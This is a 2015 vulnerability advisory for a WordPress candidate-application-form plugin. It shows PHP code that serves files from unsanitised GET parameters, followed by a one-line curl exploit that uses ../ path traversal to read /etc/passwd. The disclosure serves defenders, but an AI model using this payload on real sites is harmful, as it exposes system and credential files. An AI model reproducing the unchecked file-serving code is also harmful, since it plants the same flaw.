Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-12
Vendor Notified: 2015-07-12
Vendor Contact:
Description: This plugin allows you to easily add a candidate application form to a job vacancy post, which allows the candidate to apply for the vacancy.
Vulnerability:
The code in downloadpdffile.php  doesn&#039;t do any sanity checks, allowing a remote attacker to download sensitive system files:

 <?php
  2 $file_name = $_GET["fileName"];
  3 $path = $_GET["fileUrl"];
  4 $fullfile = $path.$file_name;
  5 if (file_exists(&#039;../../uploads/candidate_application_form/&#039;.$file_name)) {
  6     header(&#039;Pragma: public&#039;);   // required
  7     header(&#039;Expires: 0&#039;);       // no cache
  9     header(&#039;Last-Modified: &#039;.gmdate (&#039;D, d M Y H:i:s&#039;, filemtime (&#039;../../uploads/candidate_application_form/&#039;.$file_    name)).&#039; GMT&#039;);
 10     header(&#039;Cache-Control: private&#039;,false);
 11     header(&#039;Content-Type: &#039;.&#039;application/pdf&#039;);
 12     header(&#039;Content-Disposition: attachment; filename="&#039;.basename(&#039;../../uploads/candidate_application_form/&#039;.$file_    name).&#039;"&#039;);
 13     header(&#039;Content-Transfer-Encoding: binary&#039;);
 14     header(&#039;Content-Length: &#039;.filesize(&#039;../../uploads/candidate_application_form/&#039;.$file_name));    // provide file     size
 15     header(&#039;Connection: close&#039;);
 16     readfile(&#039;../../uploads/candidate_application_form/&#039;.$file_name);     // push it out
 17     exit();
 18 }

CVEID:
OSVDB:
Exploit Code:
  â€¢ $ curl http://www.example.com/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd

